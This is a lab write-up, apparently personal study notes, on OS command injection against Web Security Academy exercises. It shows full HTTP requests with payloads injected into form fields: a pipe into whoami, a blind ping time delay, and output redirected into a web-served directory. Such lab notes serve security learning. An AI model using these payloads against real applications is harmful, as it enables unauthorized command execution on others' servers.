OS command Injection
**Basic stuff**
```
POST /product/stock HTTP/2
Host: 0a010060041aae8c81a0fc90008900b5.web-security-academy.net
Cookie: session=E51KqwNALaiLndmCIvJlDoKnAUBEqsgf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a010060041aae8c81a0fc90008900b5.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a010060041aae8c81a0fc90008900b5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

productId=1|whoami&storeId=1
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a8461a76-9fc0-454f-8cf4-d87ecb65a554)






**Blind OS command injection with time delays**

Delaying ping command by 10 seconds (-c)
```
POST /feedback/submit HTTP/2
Host: 0a95007d039a30518397ad3c00460019.web-security-academy.net
Cookie: session=sRbujO1IiN9jCWjvIQqkRCx50aWXwPfL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Origin: https://0a95007d039a30518397ad3c00460019.web-security-academy.net
Referer: https://0a95007d039a30518397ad3c00460019.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=JhvWV4V9qQmkPffXWTdgyfjjQoB7Lxv0&name=sfaf&email=f%40gmail.com||ping+-c+10+127.0.0.1||whoami&subject=viet&message=asfasf
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/852252a6-00ae-47b1-9f5a-9d39e29963d5)




**Blind OS command injection with output redirection**

Email parameter again 
Save file to a /var/www/images 
```
POST /feedback/submit HTTP/2
Host: 0a470083031d3492cca4b95400ca0063.web-security-academy.net
Cookie: session=Sx8bZRPn1yESAKxu6NXOJK2PPmDCCD1v
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Origin: https://0a470083031d3492cca4b95400ca0063.web-security-academy.net
Referer: https://0a470083031d3492cca4b95400ca0063.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=emeLgSTT7CjAWA359myebWeI3sblPlE8&name=sfaf&email=f%40gmail.com||whoami>/var/www/images/whoami.txt||&subject=viet&message=f
```

Calling the file 
```
https://0a470083031d3492cca4b95400ca0063.web-security-academy.net/image?filename=whoami.txt
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/69b87ced-ba65-41ed-a94c-04b0a411d98c)


